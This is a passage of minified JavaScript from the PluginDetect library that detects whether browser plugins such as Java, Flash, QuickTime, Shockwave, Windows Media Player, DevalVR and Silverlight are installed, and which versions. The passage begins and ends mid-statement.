q?[r[0],r[1]+r[2],r[3],"0"]:[r[0],r[1].charAt(0),r[1].charAt(1),r[2]]},1,0,1]},axo:{hasRun:0,installed:0,version:null,progID:["QuickTimeCheckObject.QuickTimeCheck","QuickTimeCheckObject.QuickTimeCheck.1"],progID0:"QuickTime.QuickTime",query:function(){var r=this,t,p,q,s=r.hasRun||!PluginDetect.browser.ActiveXEnabled;r.hasRun=1;if(s){return r}for(p=0;p<r.progID.length;p++){t=PluginDetect.getAXO(r.progID[p]);if(t){r.installed=1;q=PluginDetect.pd.getPROP(t,"QuickTimeVersion");if(q&&q.toString){q=q.toString(16);r.version=parseInt(q.charAt(0)||"0",16)+"."+parseInt(q.charAt(1)||"0",16)+"."+parseInt(q.charAt(2)||"0",16);if(!PluginDetect.dbug){break}}}}return r}}};PluginDetect.addPlugin("quicktime",i);var a={mimeType:["application/x-java-applet","application/x-java-vm","application/x-java-bean"],mimeType_dummy:"application/dummymimejavaapplet",classID:"clsid:8AD9C840-044E-11D1-B3E9-00805F499D93",classID_dummy:"clsid:8AD9C840-044E-11D1-B3E9-BA9876543210",navigator:{init:function(){var q=this,p=a;q.mimeObj=PluginDetect.hasMimeType(p.mimeType);if(q.mimeObj){q.pluginObj=q.mimeObj.enabledPlugin}},a:(function(){try{return window.navigator.javaEnabled()}catch(p){}return 1})(),javaEnabled:function(){return !!this.a},mimeObj:0,pluginObj:0},OTF:null,getVerifyTagsDefault:function(){return[1,this.applet.isDisabled.VerifyTagsDefault_1()?0:1,1]},getVersion:function(x,u,w){var q=this,s,p=q.applet,v=q.verify,y=q.navigator,t=null,z=null,r=null;if(q.getVersionDone===null){q.OTF=0;y.init();if(v){v.init()}}p.setVerifyTagsArray(w);PluginDetect.file.save(q,".jar",u);if(q.getVersionDone===0){if(p.should_Insert_Query_Any()){s=p.insert_Query_Any(x);q.setPluginStatus(s[0],s[1],t,x)}return}if((!t||PluginDetect.dbug)&&q.navMime.query().version){t=q.navMime.version}if((!t||PluginDetect.dbug)&&q.navPlugin.query().version){t=q.navPlugin.version}if((!t||PluginDetect.dbug)&&q.DTK.query().version){t=q.DTK.version}if(q.nonAppletDetectionOk(t)){r=t}q.setPluginStatus(r,z,t,x);if(p.should_Insert_Query_Any()){s=p.insert_Query_Any(x);if(s[0]){r=s[0];z=s[1]}}q.setPluginStatus(r,z,t,x)},nonAppletDetectionOk:function(q){var t=this,p=t.navigator,r=PluginDetect.browser,s=1;if(!q||!p.javaEnabled()||(!r.isIE&&!p.mimeObj)){s=0}return s},setPluginStatus:function(v,w,p,u){var t=this,s,q=0,r=t.applet;p=p||t.version0;s=r.isRange(v);if(s){if(r.setRange(s,u)==v){q=s}v=0}if(t.OTF<3){t.installed=q?(q>0?0.7:-0.1):(v?1:(p?-0.2:-1))}if(t.OTF==2&&t.NOTF&&!t.applet.getResult()[0]){t.installed=p?-0.2:-1}if(t.OTF==3&&t.installed!=-0.5&&t.installed!=0.5){t.installed=(t.NOTF.isJavaActive(1)>=1?0.5:-0.5)}if(t.OTF==4&&(t.installed==-0.5||t.installed==0.5)){if(v){t.installed=1}else{if(q){t.installed=q>0?0.7:-0.1}else{if(t.NOTF.isJavaActive(1)>=1){if(p){t.installed=1;v=p}else{t.installed=0}}else{if(p){t.installed=-0.2}else{t.installed=-1}}}}}if(p){t.version0=PluginDetect.formatNum(PluginDetect.getNum(p))}if(v&&!q){t.version=PluginDetect.formatNum(PluginDetect.getNum(v))}if(w&&PluginDetect.isString(w)){t.vendor=w}if(!t.vendor){t.vendor=""}if(t.verify&&t.verify.isEnabled()){t.getVersionDone=0}else{if(t.getVersionDone!=1){if(t.OTF<2){t.getVersionDone=0}else{t.getVersionDone=t.applet.can_Insert_Query_Any()?0:1}}}},DTK:{hasRun:0,status:null,VERSIONS:[],version:"",HTML:null,Plugin2Status:null,classID:["clsid:CAFEEFAC-DEC7-0000-0001-ABCDEFFEDCBA","clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA"],mimeType:["application/java-deployment-toolkit","application/npruntime-scriptable-plugin;DeploymentToolkit"],isDisabled:function(p){var q=this;if(q.HTML){return 1}if(p||PluginDetect.dbug){return 0}if(q.hasRun||!PluginDetect.DOM.isEnabled.objectTagUsingActiveX()){return 1}return 0},query:function(B){var z=this,t=a,A,v,p=PluginDetect.DOM.altHTML,u={},q,s=null,w=null,r=z.isDisabled(B);z.hasRun=1;if(r){return z}z.status=0;if(PluginDetect.DOM.isEnabled.objectTagUsingActiveX()){for(A=0;A<z.classID.length;A++){z.HTML=PluginDetect.DOM.insert("object",["classid",z.classID[A]],[],p);s=z.HTML.obj();if(PluginDetect.pd.getPROP(s,"jvms")){break}}}else{v=PluginDetect.hasMimeType(z.mimeType);if(v&&v.type){z.HTML=PluginDetect.DOM.insert("object",["type",v.type],[],p);s=z.HTML.obj()}}if(s){try{q=PluginDetect.pd.getPROP(s,"jvms");if(q){w=q.getLength();if(PluginDetect.isNum(w)){z.status=w>0?1:-1;for(A=0;A<w;A++){v=PluginDetect.getNum(q.get(w-1-A).version);if(v){z.VERSIONS.push(v);u["a"+PluginDetect.formatNum(v)]=1}}}}}catch(y){}if(z.VERSIONS.length){z.version=PluginDetect.formatNum(z.VERSIONS[0])}}return z}},navMime:{hasRun:0,mimetype:"",version:"",mimeObj:0,pluginObj:0,regexJPI:/^\s*application\/x-java-applet;jpi-version\s*=\s*(\d.*)$/i,isDisabled:function(){var p=this,q=a;if(p.hasRun||!q.navigator.mimeObj){return 1}return 0},update:function(s){var p=this,r=s?s.enabledPlugin:0,q=s&&p.regexJPI.test(s.type||"")?PluginDetect.formatNum(PluginDetect.getNum(RegExp.$1)):0;if(q&&r&&(r.description||r.name)){if(PluginDetect.compareNums(q,p.version||PluginDetect.formatNum("0"))>0){p.version=q;p.mimeObj=s;p.pluginObj=r;p.mimetype=s.type;}}},query:function(){var t=this,s=a,w,v,B,A,z,r,q=navigator.mimeTypes,p=t.isDisabled();t.hasRun=1;if(p){return t}r=q.length;if(PluginDetect.isNum(r)){for(w=0;w<r;w++){B=0;try{B=q[w]}catch(u){}t.update(B)}}if(!t.version||PluginDetect.dbug){z=PluginDetect.isArray(s.mimeType)?s.mimeType:[s.mimeType];for(w=0;w<z.length;w++){B=0;try{B=q[z[w]]}catch(u){}A=B?B.enabledPlugin:0;r=A?A.length:null;if(PluginDetect.isNum(r)){for(v=0;v<r;v++){B=0;try{B=A[v]}catch(u){}t.update(B)}}}}return t}},navPlugin:{hasRun:0,version:"",getPlatformNum:function(){var q=a,p=0,r=/Java.*TM.*Platform[^\d]*(\d+)[\.,_]?(\d*)\s*U?(?:pdate)?\s*(\d*)/i,s=PluginDetect.pd.findNavPlugin({find:r,mimes:q.mimeType,plugins:1});if(s&&(r.test(s.name||"")||r.test(s.description||""))&&parseInt(RegExp.$1,10)>=5){p="1,"+RegExp.$1+","+(RegExp.$2?RegExp.$2:"0")+","+(RegExp.$3?RegExp.$3:"0");}return p},getPluginNum:function(){var s=this,q=a,p=0,u,t,r,w,v=0;r=/Java[^\d]*Plug-in/i;w=PluginDetect.pd.findNavPlugin({find:r,num:1,mimes:q.mimeType,plugins:1,dbug:v});if(w){u=s.checkPluginNum(w.description,r);t=s.checkPluginNum(w.name,r);p=u&&t?(PluginDetect.compareNums(u,t)>0?u:t):(u||t)}if(!p){r=/Java.*\d.*Plug-in/i;w=PluginDetect.pd.findNavPlugin({find:r,mimes:q.mimeType,plugins:1,dbug:v});if(w){u=s.checkPluginNum(w.description,r);t=s.checkPluginNum(w.name,r);p=u&&t?(PluginDetect.compareNums(u,t)>0?u:t):(u||t)}}return p},checkPluginNum:function(s,r){var p,q;p=r.test(s)?PluginDetect.formatNum(PluginDetect.getNum(s)):0;if(p&&PluginDetect.compareNums(p,PluginDetect.formatNum("10"))>=0){q=p.split(PluginDetect.splitNumRegx);p=PluginDetect.formatNum("1,"+(parseInt(q[0],10)-3)+",0,"+q[1])}if(p&&(PluginDetect.compareNums(p,PluginDetect.formatNum("1,3"))<0||PluginDetect.compareNums(p,PluginDetect.formatNum("2"))>=0)){p=0}return p},query:function(){var t=this,s=a,r,p=0,q=t.hasRun||!s.navigator.mimeObj;t.hasRun=1;if(q){return t}if(!p||PluginDetect.dbug){r=t.getPlatformNum();if(r){p=r}}if(!p||PluginDetect.dbug){r=t.getPluginNum();if(r){p=r}}if(p){t.version=PluginDetect.formatNum(p)}return t}},applet:{codebase:{isMin:function(p){this.$$=a;return PluginDetect.codebase.isMin(this,p)},search:function(){this.$$=a;return PluginDetect.codebase.search(this)},DIGITMAX:[[15,128],[6,0,512],0,[1,5,2,256],0,[1,4,1,1],[1,4,0,64],[1,3,2,32]],DIGITMIN:[1,0,0,0],Upper:["999","10","5,0,20","1,5,0,20","1,4,1,20","1,4,1,2","1,4,1","1,4"],Lower:["10","5,0,20","1,5,0,20","1,4,1,20","1,4,1,2","1,4,1","1,4","0"],convert:[function(r,q){return q?[parseInt(r[0],10)>1?"99":parseInt(r[1],10)+3+"",r[3],"0","0"]:["1",parseInt(r[0],10)-3+"","0",r[1]]},function(r,q){return q?[r[1],r[2],r[3]+"0","0"]:["1",r[0],r[1],r[2].substring(0,r[2].length-1||1)]},0,function(r,q){return q?[r[0],r[1],r[2],r[3]+"0"]:[r[0],r[1],r[2],r[3].substring(0,r[3].length-1||1)]},0,1,function(r,q){return q?[r[0],r[1],r[2],r[3]+"0"]:[r[0],r[1],r[2],r[3].substring(0,r[3].length-1||1)]},1]},results:[[null,null],[null,null],[null,null],[null,null]],getResult:function(){var q=this,s=q.results,p,r=[];for(p=s.length-1;p>=0;p--){r=s[p];if(r[0]){break}}r=[].concat(r);return r},DummySpanTagHTML:0,HTML:[0,0,0,0],active:[0,0,0,0],DummyObjTagHTML:0,DummyObjTagHTML2:0,allowed:[1,1,1,1],VerifyTagsHas:function(q){var r=this,p;for(p=0;p<r.allowed.length;p++){if(r.allowed[p]===q){return 1}}return 0},saveAsVerifyTagsArray:function(r){var q=this,p;if(PluginDetect.isArray(r)){for(p=1;p<q.allowed.length;p++){if(r.length>p-1&&PluginDetect.isNum(r[p-1])){if(r[p-1]<0){r[p-1]=0}if(r[p-1]>3){r[p-1]=3}q.allowed[p]=r[p-1]}}q.allowed[0]=q.allowed[3];}},setVerifyTagsArray:function(r){var q=this,p=a;if(p.getVersionDone===null){q.saveAsVerifyTagsArray(p.getVerifyTagsDefault())}if(PluginDetect.dbug){q.saveAsVerifyTagsArray([3,3,3])}else{if(r){q.saveAsVerifyTagsArray(r)}}},isDisabled:{single:function(q){var p=this;if(p.all()){return 1}if(q==1){return !PluginDetect.DOM.isEnabled.objectTag()}if(q==2){return p.AppletTag()}if(q===0){return PluginDetect.codebase.isDisabled()}if(q==3){return !PluginDetect.DOM.isEnabled.objectTagUsingActiveX()}return 1},all_:null,all:function(){var r=this,t=a,q=t.navigator,p,s=PluginDetect.browser;if(r.all_===null){if((s.isOpera&&PluginDetect.compareNums(s.verOpera,"13,0,0,0")<0&&!q.javaEnabled())||(r.AppletTag()&&!PluginDetect.DOM.isEnabled.objectTag())||(!q.mimeObj&&!s.isIE)){p=1}else{p=0}r.all_=p}return r.all_},AppletTag:function(){var q=a,p=q.navigator;return PluginDetect.browser.isIE?!p.javaEnabled():0},VerifyTagsDefault_1:function(){var q=PluginDetect.browser,p=1;if(q.isIE&&!q.ActiveXEnabled){p=0}if((q.isIE&&q.verIE<9)||(q.verGecko&&PluginDetect.compareNums(q.verGecko,PluginDetect.formatNum("2"))<0)||(q.isSafari&&(!q.verSafari||PluginDetect.compareNums(q.verSafari,PluginDetect.formatNum("4"))<0))||(q.isOpera&&PluginDetect.compareNums(q.verOpera,PluginDetect.formatNum("11"))<0)){p=0}return p}},can_Insert_Query:function(s){var q=this,r=q.results[0][0],p=q.getResult()[0];if(q.HTML[s]||(s===0&&r!==null&&!q.isRange(r))||(s===0&&p&&!q.isRange(p))){return 0}return !q.isDisabled.single(s)},can_Insert_Query_Any:function(){var q=this,p;for(p=0;p<q.results.length;p++){if(q.can_Insert_Query(p)){return 1}}return 0},should_Insert_Query:function(s){var r=this,t=r.allowed,q=a,p=r.getResult()[0];p=p&&(s>0||!r.isRange(p));if(!r.can_Insert_Query(s)||t[s]===0){return 0}if(t[s]==3||(t[s]==2.8&&!p)){return 1}if(!q.nonAppletDetectionOk(q.version0)){if(t[s]==2||(t[s]==1&&!p)){return 1}}return 0},should_Insert_Query_Any:function(){var q=this,p;for(p=0;p<q.allowed.length;p++){if(q.should_Insert_Query(p)){return 1}}return 0},query:function(t){var p=this,s=a,x=null,y=null,q=p.results,r,v,u=p.HTML[t];if(!u||!u.obj()||q[t][0]||s.bridgeDisabled){return}r=u.obj();v=u.readyState();if(!PluginDetect.isNum(v)||v==4){try{x=PluginDetect.getNum(r.getVersion()+"");y=r.getVendor()+"";r.statusbar(PluginDetect.win.loaded?" ":" ")}catch(w){}if(x&&PluginDetect.isStrNum(x)&&!(PluginDetect.dbug&&s.OTF<3)){q[t]=[x,y];p.active[t]=2;}}},isRange:function(p){return(/^[<>]/).test(p||"")?(p.charAt(0)==">"?1:-1):0},setRange:function(q,p){return(q?(q>0?">":"<"):"")+(PluginDetect.isString(p)?p:"")},insertJavaTag:function(z,w,p,s,D){var t=a,v="A.class",A=PluginDetect.file.getValid(t),y=A.name+A.ext,x=A.path;var u=["archive",y,"code",v],E=(s?["width",s]:[]).concat(D?["height",D]:[]),r=["mayscript","true"],C=["scriptable","true","codebase_lookup","false"].concat(r),B=t.navigator,q=!PluginDetect.browser.isIE&&B.mimeObj&&B.mimeObj.type?B.mimeObj.type:t.mimeType[0];if(z==1){return PluginDetect.browser.isIE?PluginDetect.DOM.insert("object",["type",q].concat(E),["codebase",x].concat(u).concat(C),p,t,0,w):PluginDetect.DOM.insert("object",["type",q].concat(E),["codebase",x].concat(u).concat(C),p,t,0,w)}if(z==2){return PluginDetect.browser.isIE?PluginDetect.DOM.insert("applet",["alt",p].concat(r).concat(u).concat(E),["codebase",x].concat(C),p,t,0,w):PluginDetect.DOM.insert("applet",["codebase",x,"alt",p].concat(r).concat(u).concat(E),[].concat(C),p,t,0,w)}if(z==3){return PluginDetect.browser.isIE?PluginDetect.DOM.insert("object",["classid",t.classID].concat(E),["codebase",x].concat(u).concat(C),p,t,0,w):PluginDetect.DOM.insert()}if(z==4){return PluginDetect.DOM.insert("embed",["codebase",x].concat(u).concat(["type",q]).concat(C).concat(E),[],p,t,0,w)}return PluginDetect.DOM.insert()},insertIframe:function(p){return PluginDetect.DOM.iframe.insert(99,p)},insert_Query_Any:function(w){var q=this,r=a,y=PluginDetect.DOM,u=q.results,x=q.HTML,p=y.altHTML,t,s,v=PluginDetect.file.getValid(r);if(q.should_Insert_Query(0)){if(r.OTF<2){r.OTF=2}u[0]=[0,0];t=w?q.codebase.isMin(w):q.codebase.search();if(t){u[0][0]=w?q.setRange(t,w):t}q.active[0]=t?1.5:-1}if(!v){return q.getResult()}if(!q.DummySpanTagHTML){s=q.insertIframe("applet.DummySpanTagHTML");q.DummySpanTagHTML=y.insert("",[],[],p,0,0,s);y.iframe.close(s)}if(q.should_Insert_Query(1)){if(r.OTF<2){r.OTF=2}s=q.insertIframe("applet.HTML[1]");x[1]=q.insertJavaTag(1,s,p);y.iframe.close(s);u[1]=[0,0];q.query(1)}if(q.should_Insert_Query(2)){if(r.OTF<2){r.OTF=2}s=q.insertIframe("applet.HTML[2]");x[2]=q.insertJavaTag(2,s,p);y.iframe.close(s);u[2]=[0,0];q.query(2)}if(q.should_Insert_Query(3)){if(r.OTF<2){r.OTF=2}s=q.insertIframe("applet.HTML[3]");x[3]=q.insertJavaTag(3,s,p);y.iframe.close(s);u[3]=[0,0];q.query(3)}if(y.isEnabled.objectTag()){if(!q.DummyObjTagHTML&&(x[1]||x[2])){s=q.insertIframe("applet.DummyObjTagHTML");q.DummyObjTagHTML=y.insert("object",["type",r.mimeType_dummy],[],p,0,0,s);y.iframe.close(s)}if(!q.DummyObjTagHTML2&&x[3]){s=q.insertIframe("applet.DummyObjTagHTML2");q.DummyObjTagHTML2=y.insert("object",["classid",r.classID_dummy],[],p,0,0,s);y.iframe.close(s)}}r.NOTF.init();return q.getResult()}},NOTF:{count:0,count2:0,countMax:25,intervalLength:250,init:function(){var q=this,p=a;if(p.OTF<3&&q.shouldContinueQuery()){p.OTF=3;PluginDetect.ev.setTimeout(q.onIntervalQuery,q.intervalLength);}},allHTMLloaded:function(){var r=a.applet,q,p=[r.DummySpanTagHTML,r.DummyObjTagHTML,r.DummyObjTagHTML2].concat(r.HTML);for(q=0;q<p.length;q++){if(p[q]&&p[q].loaded!==null&&!p[q].loaded){return 0}}return 1},shouldContinueQuery:function(){var t=this,s=a,r=s.applet,q,p=0;if(t.allHTMLloaded()){if(t.count-t.count2>2){return p}}else{t.count2=t.count}for(q=0;q<r.results.length;q++){if(r.HTML[q]){if(!r.results[q][0]&&(r.allowed[q]>=2||(r.allowed[q]==1&&!r.getResult()[0]))&&(!t.count||t.isAppletActive(q)>=0)){p=1}}}return p},isJavaActive:function(s){var u=this,r=a,p,q,t=-9;for(p=0;p<r.applet.HTML.length;p++){q=u.isAppletActive(p,s);if(q>t){t=q}}return t},isAppletActive:function(t,u){var v=this,q=a,A=q.navigator,p=q.applet,w=p.HTML[t],s=p.active,z,r=0,y,B=s[t];if(u||B>=1.5||!w||!w.span()){return B}y=PluginDetect.DOM.getTagStatus(w,p.DummySpanTagHTML,p.DummyObjTagHTML,p.DummyObjTagHTML2,v.count);for(z=0;z<s.length;z++){if(s[z]>0){r=1}}if(y!=1){B=y}else{if(PluginDetect.browser.isIE||(q.version0&&A.javaEnabled()&&A.mimeObj&&(w.tagName=="object"||r))){B=1}else{B=0}}s[t]=B;return B},onIntervalQuery:function(){var q=a.NOTF,p;q.count++;if(a.OTF==3){p=q.queryAllApplets();if(!q.shouldContinueQuery()){q.queryCompleted(p)}}if(a.OTF==3){PluginDetect.ev.setTimeout(q.onIntervalQuery,q.intervalLength)}},queryAllApplets:function(){var t=this,s=a,r=s.applet,q,p;for(q=0;q<r.results.length;q++){r.query(q)}p=r.getResult();return p},queryCompleted:function(p){var r=this,q=a;if(q.OTF>=4){return}q.OTF=4;r.isJavaActive();q.setPluginStatus(p[0],p[1],0);PluginDetect.ev.callArray(q.DoneHndlrs);}}};PluginDetect.addPlugin("java",a);var m={getVersion:function(){var r=this,p=null,q;if((!q||PluginDetect.dbug)&&r.nav.query().installed){q=1}if((!p||PluginDetect.dbug)&&r.nav.query().version){p=r.nav.version}if((!q||PluginDetect.dbug)&&r.axo.query().installed){q=1}if((!p||PluginDetect.dbug)&&r.axo.query().version){p=r.axo.version}r.installed=p?1:(q?0:-1);r.version=PluginDetect.formatNum(p)},nav:{hasRun:0,installed:0,version:null,mimeType:"application/x-devalvrx",query:function(){var s=this,p,r,q=s.hasRun||!PluginDetect.hasMimeType(s.mimeType);s.hasRun=1;if(q){return s}r=PluginDetect.pd.findNavPlugin({find:"DevalVR.*Plug-?in",mimes:s.mimeType,plugins:"DevalVR 3D Plugin"});if(r&&(/Plug-?in(.*)/i).test(r.description||"")){p=PluginDetect.getNum(RegExp.$1)}if(r){s.installed=1}if(p){s.version=p}return s}},axo:{hasRun:0,installed:0,version:null,progID:["DevalVRXCtrl.DevalVRXCtrl","DevalVRXCtrl.DevalVRXCtrl.1"],classID:"clsid:5D2CF9D0-113A-476B-986F-288B54571614",query:function(){var s=this,v=m,q,p,u,r,t=s.hasRun;s.hasRun=1;if(t){return s}for(p=0;p<s.progID.length;p++){u=PluginDetect.getAXO(s.progID[p]);if(u){s.installed=1;if(!PluginDetect.dbug){break}}}if(u&&PluginDetect.DOM.isEnabled.objectTagUsingActiveX()){r=PluginDetect.pd.getPROP(PluginDetect.DOM.insert("object",["classid",s.classID],["src",""],"",v).obj(),"pluginversion");if(r&&r.toString){q="00000000"+r.toString(16);q=q.substr(q.length-8,8);q=parseInt(q.substr(0,2)||"0",16)+","+parseInt(q.substr(2,2)||"0",16)+","+parseInt(q.substr(4,2)||"0",16)+","+parseInt(q.substr(6,2)||"0",16);if(q){s.version=q}}}return s}}};PluginDetect.addPlugin("devalvr",m);var e={mimeType:"application/x-shockwave-flash",setPluginStatus:function(s,p){var r=this,q;r.installed=p?1:(s?0:-1);r.version=PluginDetect.formatNum(p);q=r.installed==-1||r.instance.version;q=q||r.axo.version;r.getVersionDone=q?1:0},getVersion:function(t,q){var r=this,p=null,s=0;if((!s||PluginDetect.dbug)&&r.navPlugin.query().installed){s=1}if((!p||PluginDetect.dbug)&&r.navPlugin.query().version){p=r.navPlugin.version}if((!s||PluginDetect.dbug)&&r.axo.query().installed){s=1}if((!p||PluginDetect.dbug)&&r.axo.query().version){p=r.axo.version}if(((!s&&!p)||q||PluginDetect.dbug)&&r.instance.query().version){s=1;p=r.instance.version}r.setPluginStatus(s,p)},navPlugin:{hasRun:0,installed:0,version:null,getNum:function(q){if(!q){return null}var p=/[\d][\d\,\.\s]*[rRdD]{0,1}[\d\,]*/.exec(q);return p?p[0].replace(/[rRdD\.]/g,",").replace(/\s/g,""):null},query:function(){var s=this,q=e,p,t,r=s.hasRun||!PluginDetect.hasMimeType(q.mimeType);s.hasRun=1;if(r){return s}t=PluginDetect.pd.findNavPlugin({find:"Shockwave.*Flash",mimes:q.mimeType,plugins:["Shockwave Flash"]});if(t){s.installed=1;if(t.description){p=s.getNum(t.description)}}if(p){p=PluginDetect.getPluginFileVersion(t,p)}if(p){s.version=p}return s}},axo:{hasRun:0,installed:0,version:null,progID:"ShockwaveFlash.ShockwaveFlash",classID:"clsid:D27CDB6E-AE6D-11CF-96B8-444553540000",query:function(){var r=this,q,p,u,s=r.hasRun;r.hasRun=1;if(s){return r}for(p=0;p<10;p++){u=PluginDetect.getAXO(r.progID+(p?"."+p:""));if(u){r.installed=1;q=0;try{q=PluginDetect.getNum(u.GetVariable("$version")+"");}catch(t){}if(q){r.version=q;if(!PluginDetect.dbug){break}}}}return r}},instance:{hasRun:0,version:null,HTML:null,isEnabled:function(){var q=this,r=e,p=1;if(q.hasRun||PluginDetect.DOM.isEnabled.objectTagUsingActiveX()||!PluginDetect.DOM.isEnabled.objectTag()||!PluginDetect.hasMimeType(r.mimeType)){p=0}return p},query:function(){var p=this,r=e,q=p.isEnabled();p.hasRun=1;if(q){p.HTML=PluginDetect.DOM.insert("object",["type",r.mimeType],["play","false","menu","false"],"",r);try{p.version=PluginDetect.getNum(p.HTML.obj().GetVariable("$version")+"");}catch(s){}}return p}}};PluginDetect.addPlugin("flash",e);var k={getVersion:function(){var r=this,p=null,q;if((!q||PluginDetect.dbug)&&r.nav.query().installed){q=1}if((!p||PluginDetect.dbug)&&r.nav.query().version){p=r.nav.version}if((!q||PluginDetect.dbug)&&r.axo.query().installed){q=1}if((!p||PluginDetect.dbug)&&r.axo.query().version){p=r.axo.version}r.installed=p?1:(q?0:-1);r.version=PluginDetect.formatNum(p)},nav:{hasRun:0,installed:0,version:null,mimeType:"application/x-director",query:function(){var s=this,p,r,q=s.hasRun||!PluginDetect.hasMimeType(s.mimeType);s.hasRun=1;if(q){return s}r=PluginDetect.pd.findNavPlugin({find:"Shockwave\\s*for\\s*Director",mimes:s.mimeType,plugins:"Shockwave for Director"});if(r&&r.description){p=PluginDetect.getNum(r.description+"")}if(p){p=PluginDetect.getPluginFileVersion(r,p)}if(r){s.installed=1}if(p){s.version=p}return s}},axo:{hasRun:0,installed:null,version:null,progID:["SWCtl.SWCtl","SWCtl.SWCtl.1","SWCtl.SWCtl.7","SWCtl.SWCtl.8","SWCtl.SWCtl.11","SWCtl.SWCtl.12"],classID:"clsid:166B1BCA-3F9C-11CF-8075-444553540000",query:function(){var t=this,v,p,q,w,s,r=!t.hasRun;t.hasRun=1;if(r){for(p=0;p<t.progID.length;p++){v=PluginDetect.getAXO(t.progID[p]);if(v){t.installed=1;w="";try{w=v.ShockwaveVersion("")+"";}catch(u){}if((/(\d[\d\.\,]*)(?:\s*r\s*(\d+))?/i).test(w)){s=RegExp.$2;q=PluginDetect.formatNum(RegExp.$1);if(s){q=q.split(PluginDetect.splitNumRegx);q[3]=s;q=q.join(",")}}if(q){t.version=q;if(!PluginDetect.dbug){break}}}}}return t}}};PluginDetect.addPlugin("shockwave",k);var o={setPluginStatus:function(p,r){var q=this;if(p){q.version=PluginDetect.formatNum(p)}q.installed=q.version?1:(r?0:-1);q.getVersionDone=q.installed===0?0:1;},getVersion:function(t,q){var r=this,s,p=null;if((!s||PluginDetect.dbug)&&r.nav.query().installed){s=1}if((!s||PluginDetect.dbug)&&r.axo.query().installed){s=1}if((!p||PluginDetect.dbug)&&r.axo.query().version){p=r.axo.version}if(((!s&&!p)||q||PluginDetect.dbug)&&r.FirefoxPlugin.query().version){s=1;p=r.FirefoxPlugin.version}r.setPluginStatus(p,s)},mimeType:["application/x-ms-wmp","application/asx","application/x-mplayer2","video/x-ms-asf","video/x-ms-wm","video/x-ms-asf-plugin"],find:["Microsoft.*Windows\\s*Media\\s*Player.*Firefox.*Plug-?in","Windows\\s*Media\\s*Player\\s*Plug-?in\\s*Dynamic\\s*Link\\s*Library","Flip4Mac.*Windows\\s*Media.*Plug-?in|Flip4Mac.*WMV.*Plug-?in"],avoid:"Totem|VLC|RealPlayer|Helix",plugins:["Microsoft"+String.fromCharCode(174)+" Windows Media Player Firefox Plugin","Windows Media Player Plug-in Dynamic Link Library"],nav:{hasRun:0,installed:0,query:function(){var s=this,p=o,r,q=s.hasRun||!PluginDetect.hasMimeType(p.mimeType);s.hasRun=1;if(q){return s}r=PluginDetect.pd.findNavPlugin({find:p.find.join("|"),avoid:p.avoid,mimes:p.mimeType,plugins:p.plugins});if(r){s.installed=1}return s}},FirefoxPlugin:{hasRun:0,version:null,isDisabled:function(){var p=this,r=o,q=PluginDetect.browser;if(p.hasRun||(q.isGecko&&PluginDetect.compareNums(q.verGecko,PluginDetect.formatNum("1.8"))<0)||(q.isOpera&&PluginDetect.compareNums(q.verOpera,PluginDetect.formatNum("10"))<0)||PluginDetect.DOM.isEnabled.objectTagUsingActiveX()||!PluginDetect.hasMimeType(r.mimeType)||!PluginDetect.pd.findNavPlugin({find:r.find[0],avoid:r.avoid,mimes:r.mimeType,plugins:r.plugins[0]})){return 1}return 0},query:function(){var q=this,r=o,p,s=q.isDisabled();q.hasRun=1;if(s){return q}p=PluginDetect.pd.getPROP(PluginDetect.DOM.insert("object",["type",PluginDetect.hasMimeType(r.mimeType).type,"data",""],["src",""],"",r).obj(),"versionInfo");if(p){q.version=PluginDetect.getNum(p)}return q}},axo:{hasRun:0,installed:null,version:null,progID:["WMPlayer.OCX","WMPlayer.OCX.7"],classID:"clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6",query:function(){var s=this,t,p,q,r=!s.hasRun;s.hasRun=1;if(r){for(p=0;p<s.progID.length;p++){t=PluginDetect.getAXO(s.progID[p]);if(t){s.installed=1;q=PluginDetect.pd.getPROP(t,"versionInfo",0);if(q){q=PluginDetect.getNum(q)}if(q){s.version=q;if(!PluginDetect.dbug){break}}}}}return s}}};PluginDetect.addPlugin("windowsmediaplayer",o);var h={getVersion:function(){var r=this,p=null,q=0;if((!q||PluginDetect.dbug)&&r.nav.query().installed){q=1}if((!p||PluginDetect.dbug)&&r.nav.query().version){p=r.nav.version}if((!q||PluginDetect.dbug)&&r.axo.query().installed){q=1}if((!p||PluginDetect.dbug)&&r.axo.query().version){p=r.axo.version}r.version=PluginDetect.formatNum(p);r.installed=p?1:(q?0:-1)},nav:{hasRun:0,installed:0,version:null,mimeType:["application/x-silverlight","application/x-silverlight-2"],query:function(){var t=this,p,q,s,r=t.hasRun||!PluginDetect.hasMimeType(t.mimeType);t.hasRun=1;if(r){return t}s=PluginDetect.pd.findNavPlugin({find:"Silverlight.*Plug-?in",mimes:t.mimeType,plugins:"Silverlight Plug-In"});if(s){t.installed=1}if(s&&s.description){q=PluginDetect.formatNum(PluginDetect.getNum(s.description+""))}if(q){p=q.split(PluginDetect.splitNumRegx);if(parseInt(p[0],10)<2&&parseInt(p[2],10)>=30226){p[0]="2"}q=p.join(",")}if(q){t.version=q}return t}},axo:{hasRun:0,installed:0,version:null,progID:"AgControl.AgControl",maxdigit:[20,10,10,100,100,10],mindigit:[0,0,0,0,0,0],IsVersionSupported:function(s,q){var p=this;try{return p.testVersion?PluginDetect.compareNums(PluginDetect.formatNum(p.testVersion.join(",")),PluginDetect.formatNum(q.join(",")))>=0:s.IsVersionSupported(p.format(q))}catch(r){}return 0},format:function(q){var p=this;return(q[0]+"."+q[1]+"."+q[2]+p.make2digits(q[3])+p.make2digits(q[4])+"."+q[5])},make2digits:function(p){return(p<10?"0":"")+p+""},query:function(){var r=this,q,v,s=r.hasRun;r.hasRun=1;if(s){return r}v=PluginDetect.getAXO(r.progID);if(v){r.installed=1}if(v&&r.IsVersionSupported(v,r.mindigit)){var p=[].concat(r.mindigit),u,t=0;for(q=0;q<r.maxdigit.length;q++){u=0;while(r.maxdigit[q]-r.mindigit[q]>1&&u<20){u++;t++;p[q]=Math.round((r.maxdigit[q]+r.mindigit[q])/2);if(r.IsVersionSupported(v,p)){r.mindigit[q]=p[q]}else{r.maxdigit[q]=p[q]}}p[q]=r.mindigit[q]}r.version=r.format(p);}return r}}};PluginDetect.addPlugin("silverlight",h);var f={compareNums:function(s,r){var 